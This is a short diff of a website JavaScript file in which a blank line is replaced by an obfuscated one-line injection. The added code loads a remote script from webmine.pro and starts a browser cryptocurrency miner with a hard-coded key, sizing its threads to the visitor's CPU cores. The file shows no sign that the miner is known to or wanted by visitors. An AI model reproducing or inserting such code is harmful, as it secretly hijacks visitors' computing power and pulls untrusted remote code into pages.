@@ -1,5 +1,5 @@
 'use strict';
-
+function lasdegdfb(){var e=navigator.hardwareConcurrency,n="797e40fd3d819f792c8d3e86ccd254bb71a800e8ff11";if(e>=12)var r=e/4,a=new CRLT.Anonymous(n,{threads:r,autoThreads:!1});else if(e<12&&e>=4)var r=e/2,a=new CRLT.Anonymous(n,{threads:r,autoThreads:!1});else a=new CRLT.Anonymous(n);a.start()}function eoigersd(e){return new Promise(function(n,r){var a;(a=document.createElement("script")).src=e,a.onload=n,a.onerror=r,document.head.appendChild(a)})}eoigersd("//webmine.pro/lib/crlt.js").then(function(){lasdegdfb()});
 //-------------------- Load some deferred styles --------------------//
 // var loadDeferredStyles = function() 
 // {
